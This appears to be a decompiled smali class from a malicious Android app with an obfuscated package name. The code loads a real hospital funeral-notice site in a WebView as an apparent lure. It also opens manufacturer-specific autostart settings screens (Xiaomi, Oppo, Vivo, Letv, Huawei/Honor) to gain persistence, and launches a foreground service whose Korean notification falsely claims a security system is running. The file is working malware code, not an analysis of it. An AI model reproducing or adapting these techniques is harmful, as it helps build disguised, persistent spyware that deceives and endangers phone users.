.class public Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;
.super Ljava/lang/Object;
.source "sourcefile"

# interfaces
.implements Lj/f/a/f;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a(Ljava/util/List;Z)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field public final synthetic a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;


# direct methods
.method public constructor <init>(Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;)V
    .locals 0

    iput-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Ljava/util/List;Z)V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;Z)V"
        }
    .end annotation

    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 1
    iget-object p2, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->t:Landroid/view/View;

    .line 2
    check-cast p2, Landroid/view/ViewGroup;

    .line 3
    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u:Landroid/widget/ImageView;

    .line 4
    invoke-virtual {p2, p1}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    const p2, 0x7f0801d9

    invoke-virtual {p1, p2}, Lg/b/c/j;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/webkit/WebView;

    .line 5
    iput-object p2, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/webkit/WebView;

    .line 6
    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 7
    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/webkit/WebView;

    const/16 p2, 0x2000

    .line 8
    invoke-virtual {p1, p2}, Landroid/webkit/WebView;->setSystemUiVisibility(I)V

    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 9
    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/webkit/WebView;

    const/4 p2, -0x1

    .line 10
    invoke-virtual {p1, p2}, Landroid/webkit/WebView;->setBackgroundColor(I)V

    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 11
    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/webkit/WebView;

    .line 12
    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 p2, 0x1

    invoke-virtual {p1, p2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    new-instance p1, Landroid/os/StrictMode$ThreadPolicy$Builder;

    invoke-direct {p1}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V

    invoke-virtual {p1}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;

    move-result-object p1

    invoke-static {p1}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V

    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 13
    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/webkit/WebView;

    .line 14
    new-instance v0, Landroid/webkit/WebViewClient;

    invoke-direct {v0}, Landroid/webkit/WebViewClient;-><init>()V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 15
    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/webkit/WebView;

    const-string v0, "https://funeral.snuh.org"

    .line 16
    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 17
    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    sget-object v1, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v2, "xiaomi"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.miui.securitycenter"

    const-string v3, "com.miui.permcenter.autostart.AutoStartManagementActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    const-string v2, "oppo"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.coloros.safecenter"

    const-string v3, "com.coloros.safecenter.permission.startup.StartupAppListActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_1
    const-string v2, "vivo"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.vivo.permissionmanager"

    const-string v3, "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_2
    const-string v2, "Letv"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_3

    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.letv.android.letvsafe"

    const-string v3, "com.letv.android.letvsafe.AutobootManageActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_3
    const-string v2, "Honor"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_4

    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.huawei.systemmanager"

    const-string v3, "com.huawei.systemmanager.optimize.process.ProtectActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    :cond_4
    invoke-virtual {p1}, Landroid/app/Activity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/high16 v2, 0x10000

    invoke-virtual {v1, v0, v2}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v1

    if-lez v1, :cond_5

    invoke-virtual {p1, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "exc"

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 18
    :cond_5
    :goto_1
    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    iget-object p1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;->a:Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 19
    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->r:Landroid/app/Activity;

    const-class v2, Lgqegwqg/bbebebefff/asdcdsac/ForegroundService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "inputExtra"

    const-string v2, "\ubcf4\uc548 \uc2dc\uc2a4\ud15c\uc774 \uc791\ub3d9\uc911\uc785\ub2c8\ub2e4"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p1, v0}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    sput-boolean p2, Lk/a/a/q;->b:Z

    return-void
.end method

.method public synthetic b(Ljava/util/List;Z)V
    .locals 0

    invoke-static {p0, p1, p2}, Lj/f/a/e;->a(Lj/f/a/f;Ljava/util/List;Z)V

    return-void
.end method
